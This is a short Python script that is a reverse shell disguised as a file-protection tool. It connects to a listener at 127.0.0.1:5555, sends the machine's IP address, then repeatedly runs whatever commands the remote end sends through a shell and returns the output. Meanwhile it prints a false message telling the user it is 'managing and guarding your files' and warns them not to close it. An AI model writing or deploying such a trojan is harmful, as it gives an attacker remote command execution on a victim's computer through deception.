import socket
import subprocess as sp
import sys
import time

host = "127.0.0.1"
port = 5555
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    conn.connect((host, port))
    shoc = sp.Popen("echo Connected!", shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
    out = shoc.stdout.read() + shoc.stderr.read()
    conn.send(out)
    hn = socket.gethostname()
    IP = socket.gethostbyname(hn)
    shoc = sp.Popen("echo "+str(IP), shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
    out = shoc.stdout.read() + shoc.stderr.read()
    conn.send(out)
    print("Scanning and managing files...")
    print("\nThis will keep managing and guarding your files, it will report to your computer when it spot threats, close it you will lose the management of your files.")
    f = open("Threats.txt", "w")
    while True:
        shoc = sp.Popen("echo :", shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
        out = shoc.stdout.read() + shoc.stderr.read()
        conn.send(out)
        command = conn.recv(1024)
        str = command.decode("utf-8")
        if command.strip().decode("utf-8") == "kill":
            kill = True
            break
        sh = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
        output = sh.stdout.read() + sh.stderr.read()
        conn.send(output)
except Exception as error:
    print(error)
    raise
